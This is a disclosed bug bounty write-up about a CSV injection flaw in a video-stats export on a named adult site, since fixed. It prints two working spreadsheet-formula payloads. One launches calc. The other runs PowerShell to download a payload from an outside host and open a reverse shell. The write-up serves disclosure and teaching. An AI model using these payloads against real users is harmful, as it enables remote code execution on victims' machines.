# CSV Injection -> Meterpreter on Pornhub
This post will discuss an issue I found regarding CSV injection on Pornhub.com, allowing a remote attacker to inject malicious code into video titles resulting in potential full compromise of content creators and other users.

**Note: Pornhub have advised that they will no longer be rewarding for this type of bug. Additionally, this issue has now been fixed, Pornhub have closed the report and pushed out a code fix**

Difficulty: **Medium** 
Risk: **High**
Affected URLs: pornhub.com 
Report Link: https://hackerone.com/reports/146593
Date Reported: June 22nd, 2016 
Date Report Made Public: July 4th, 2016

This issue has been marked as high risk in this scenario based upon the affected user base and locations, however in a normal situation this would be regarded as Medium/Low.

**tl;dr this vulnerability is exploiting CSV injection, to gain meterpreter session on a victim's local system.**

I identified that the export video stats function was vulnerable to CSV injection that could be chained with a meterpreter payload resulting in client side remote code execution. The payload used to achieve the proof of concept is as follows:

`@SUM(1+2+3)*cmd|' /C calc'!A0`

This will launch calculator when the spreadsheet is downloaded and launched, it was identified that pornhub takes certain steps to attempt to escape this however it seems that the `@` character has been missed from the blacklisted characters and thus makes this attack possible. 

To highlight the risk of this vulnerability, executing calc.exe isnâ€™t enough sometimes, it doesn't look as impressive as a meterpreter shell. This is possible by using the following value:

`@SUM(1+2+3)*cmd|'/C powershell IEX(wget 0r.pe/p)'!A0`

This payload works by, when the CSV file is opened powershell is launched in the background which attempts to grab the Powersploit payload of Invoke-Shellcode to attempt a reverse shell connection back to the attacker's server.

####Remediation
The recommended steps to remediate this issue in particular would be to ensure that video names contain only alpha-numeric characters and cannot be modified to add arbitrary characters.
